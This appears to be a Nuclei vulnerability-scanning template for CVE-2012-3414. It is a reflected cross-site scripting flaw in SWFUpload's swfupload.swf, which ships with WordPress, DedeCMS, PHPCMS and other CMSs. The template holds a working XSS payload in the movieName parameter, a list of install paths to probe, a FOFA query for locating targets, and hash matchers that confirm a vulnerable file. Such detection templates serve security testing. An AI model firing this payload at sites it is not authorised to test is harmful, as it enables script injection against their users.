id: CVE-2012-3414

info:
  name: CVE-2012-3414
  author: pwnhxl
  severity: medium
  description: |
    Cross-site scripting (XSS) vulnerability in swfupload.swf in SWFUpload 2.2.0.1 and earlier, as used in WordPress before 3.3.2, TinyMCE Image Manager 1.1, and other products, allows remote attackers to inject arbitrary web script or HTML via the movieName parameter, related to the "ExternalInterface.call" function.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3414
    - https://packetstormsecurity.com/files/121348/SWFUpload-CSRF-XSS-Object-Injection.html
  metadata:
    verified: "true"
    fofa-query: app="wordpress" || app="DedeCMS" || app="PHPCMS" || app="74CMS"
  tags: cve,cve-2012,swfupload,xss,wordpress,dedecms,phpcms,74cms

requests:
  - raw:
      - |
        GET {{path}}?movieName="])}catch(e){if(!window.x){window.x=1%3Balert(document.domain)}}// HTTP/1.1
        Host: {{Hostname}}

    payloads:
      path:
        - "/wp-includes/js/swfupload/swfupload.swf" # wordpress
        - "/images/swfupload/swfupload.swf" # dedecms
        - "/admin/kindeditor/plugins/multiimage/images/swfupload.swf" # 74cms
        - "/statics/js/swfupload/swfupload.swf" # phpcms
        - "/common/swfupload/swfupload.swf" # cmsseay
        - "/adminsoft/js/swfupload.swf" # espcms
        - "/js/upload/swfupload/swfupload.swf" # phpyun
        - "/include/lib/js/uploadify/uploadify.swf" # emlog
        - "/kindeditor/plugins/multiimage/images/swfupload.swf" # kindeditor
        - "/js/kindeditor/plugins/multiimage/images/swfupload.swf" # kindeditor
        - "/js/swfupload/swfupload.swf" # phpok
        - "/Plus/swfupload/swfupload/swfupload.swf" # kesioncms
        - "/addons/theme/stv1/_static/js/swfupload/swfupload.swf" # thinksns
        - "/includes/js/upload.swf" # phpdisk
        - "/e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf" # pageadmin
        - "/lib/swf/swfupload.swf" # sdcms
        - "/admin/js/swfupload.swf" # unknown
        - "/swfupload/swfupload.swf" # unknown
    attack: batteringram

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - application/x-shockwave-flash

      - type: dsl
        dsl:
          - "contains(md5(body), '53fef78841c3fae1ee992ae324a51620') || contains(md5(body), '3a1c6cc728dddc258091a601f28a9c12') || contains(md5(body), '4c2fc69dc91c885837ce55d03493a5f5')"

      - type: status
        status:
          - 200
